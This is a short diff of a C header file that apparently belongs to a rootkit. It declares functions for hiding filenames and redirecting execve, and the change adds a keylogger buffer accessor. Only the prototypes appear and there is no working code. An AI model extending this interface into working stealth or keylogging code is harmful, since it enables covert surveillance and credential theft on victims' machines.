@@ -17,5 +17,6 @@ void hide_filename(const char *name);
 void unhide_filename(const char *name);
 void redirect_execve(char *path);
 void unredirect_execve(char *path);
+void get_keylogger_buf(const char *path);
 
 #endif
